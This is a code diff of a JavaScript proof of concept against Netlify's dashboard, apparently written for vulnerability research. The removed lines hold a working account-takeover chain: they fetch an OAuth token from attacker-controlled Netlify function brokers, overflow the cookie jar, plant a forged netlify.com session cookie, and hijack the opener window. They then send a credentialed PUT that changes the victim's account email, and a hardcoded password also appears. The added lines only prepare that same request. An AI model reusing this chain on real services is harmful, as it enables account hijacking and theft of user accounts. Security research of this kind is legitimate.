@@ -1,113 +1,98 @@
-(async () => {
-  const DASHBOARD_PASSWORD = "XSS-Runners-2026!7Kp4";
+(() => {
+  const USER_ENDPOINT =
+    "https://app.netlify.com/access-control/bb-api/api/v1/user";
 
-  const API_HOSTS = {
-    custom:
-      "https://interactive-custom-control-xss-20261015.netlify.app/.netlify/functions/oauth-broker",
-    asset:
-      "https://interactive-asset-source-xss-20261015.netlify.app/.netlify/functions/oauth-broker",
-    chrome2:
-      "https://owned-chrome2-wfui-xss-20261015.netlify.app/.netlify/functions/login-broker"
+  let host;
+
+  try {
+    host =
+      window.parent &&
+      window.parent !== window &&
+      window.parent.location.origin === "https://app.netlify.com"
+        ? window.parent
+        : window;
+  } catch {
+    host = window;
+  }
+
+  // Capture these synchronously before Workflow UI applies its sandbox.
+  const hostOrigin = host.location.origin;
+  const hostUrl = new URL(host.location.href);
+  const hostFetch = host.fetch.bind(host);
+  const requestedEmail = hostUrl.searchParams.get("email");
+
+  const result = {
+    hostOrigin,
+    requestedEmailPresent: Boolean(requestedEmail),
+    authenticatedRead: false,
+    userIdentifierPresent: false,
+    requestPrepared: false,
+    sent: false,
+    proposedRequest: null,
+    error: null
   };
 
-  const basicAuth = `Basic ${btoa(`proof:${DASHBOARD_PASSWORD}`)}`;
+  host.__NETLIFY_EMAIL_CHANGE_SAFE_POC__ = result;
 
-  async function getSessionUrl(mode = "custom") {
-    const endpoint = API_HOSTS[mode];
-
-    if (!endpoint) {
-      throw new Error(`Unknown mode: ${mode}`);
+  (async () => {
+    if (hostOrigin !== "https://app.netlify.com") {
+      throw new Error(`Unexpected execution origin: ${hostOrigin}`);
     }
 
-    const response = await fetch(endpoint, {
-      method: "POST",
+    if (!requestedEmail) {
+      throw new Error("Missing ?email= query parameter");
+    }
+
+    const response = await hostFetch(USER_ENDPOINT, {
+      method: "GET",
       credentials: "include",
       cache: "no-store",
       headers: {
-        "Content-Type": "application/json",
-        Authorization: basicAuth
-      },
-      body: JSON.stringify({})
+        Accept: "application/json"
+      }
     });
 
-    const responseText = await response.text();
-    let data = {};
-
-    try {
-      data = responseText ? JSON.parse(responseText) : {};
-    } catch {
-      throw new Error(
-        `Invalid broker response: HTTP ${response.status} ${responseText}`
-      );
+    if (!response.ok) {
+      throw new Error(`GET /user failed: HTTP ${response.status}`);
     }
 
-    if (!response.ok || data.ok === false) {
-      throw new Error(data.error || `HTTP ${response.status}`);
-    }
+    const currentUser = await response.json();
 
-    if (data.state !== "ready" || typeof data.loginUrl !== "string") {
-      throw new Error("Broker did not return a ready login URL");
-    }
+    result.authenticatedRead = true;
+    result.userIdentifierPresent = Boolean(currentUser.id);
 
-    return new URL(data.loginUrl, window.location.href);
-  }
+    result.proposedRequest = {
+      url: USER_ENDPOINT,
+      options: {
+        method: "PUT",
+        mode: "cors",
+        credentials: "include",
+        cache: "no-store",
+        headers: {
+          Accept: "*/*",
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          full_name: currentUser.full_name,
+          email: requestedEmail,
+          preferred_account_id:
+            currentUser.preferred_account_id || ""
+        })
+      }
+    };
 
-  const sessionUrl = await getSessionUrl("chrome2");
-  const hashParams = new URLSearchParams(sessionUrl.hash.slice(1));
-  const token = hashParams.get("access_token");
+    result.requestPrepared = true;
 
-  if (!token) {
-    throw new Error("No access token found in the broker URL");
-  }
-
-  const isNetlifyDomain =
-    window.location.hostname === "netlify.com" ||
-    window.location.hostname.endsWith(".netlify.com");
-
-  if (!isNetlifyDomain) {
-    throw new Error(
-      `Cannot set a netlify.com cookie from ${window.location.hostname}`
-    );
-  }
-
-  const junkCookieOptions = "Path=/";
-  let previousVisibleCount = -1;
-
-  for (let i = 0; i < 400; i++) {
-    document.cookie =
-      `junk${i}=${"A".repeat(32)}; ${junkCookieOptions}`;
-
-    const visibleCount = document.cookie
-      ? document.cookie.split(/;\s*/).length
-      : 0;
-
-    if (visibleCount === previousVisibleCount) {
-      break;
-    }
-
-    previousVisibleCount = visibleCount;
-  }
-
-  const cookieOptions = [
-    "Path=/studio/6acfc3b2b4515ccf9f90a91b",
-    "Domain=netlify.com",
-    "Secure",
-    "SameSite=None"
-  ].join("; ");
-
-  document.cookie =
-    `accessToken=${encodeURIComponent(token)}; ${cookieOptions}`;
-
-  const oauthUrl =
-    "https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=aade9842-b8db-45b9-92a4-bd807ffdade1&login=true&redirect=https%3A%2F%2Fapp.netlify.com%2Fedge-access%3Fdomain%3Dinternal.netlify.com%26requested_path%3D%252F%26site_id%3D947876e2-b71a-4ce5-88c3-6a4040d6a0b1%26strict_saml%3Dtrue&use_redirect=true";
-
-  if (window.opener && !window.opener.closed) {
-    window.opener.location = oauthUrl;
-    
-(async()=>{const o=window.opener;console.log("[+] waiting for opener to become same-origin");let n=0;while(o&&!o.closed){try{if(o.location.origin===location.origin){console.log("[+] opener is now same-origin:",o.location.origin);break}}catch{if(n++%10===0)console.log("[.] still cross-origin")}await new Promise(r=>setTimeout(r,100))}if(!o||o.closed)throw Error("opener closed");const email=new URLSearchParams(location.search).get("email");console.log("[+] email parameter:",email);const res=await o.fetch("https://app.netlify.com/access-control/bb-api/api/v1/user",{method:"PUT",headers:{"content-type":"application/json"},credentials:"include",body:JSON.stringify({full_name:"hamid hamdad",email,preferred_account_id:""})});console.log("[+] response:",res.status,res.statusText);console.log("[+] body:",await res.clone().text());return res})().catch(e=>console.error("[-]",e))  } else {
-    window.location.assign(oauthUrl);
-  }
-})().catch((error) => {
-  console.error("Launcher failed:", error);
-});
-
+    console.info("Netlify safe PoC completed", {
+      hostOrigin: result.hostOrigin,
+      requestedEmailPresent: result.requestedEmailPresent,
+      authenticatedRead: result.authenticatedRead,
+      userIdentifierPresent: result.userIdentifierPresent,
+      requestPrepared: result.requestPrepared,
+      sent: result.sent
+    });
+  })().catch((error) => {
+    result.error = String(error);
+    console.error("Netlify safe PoC failed:", error);
+  });
+})();
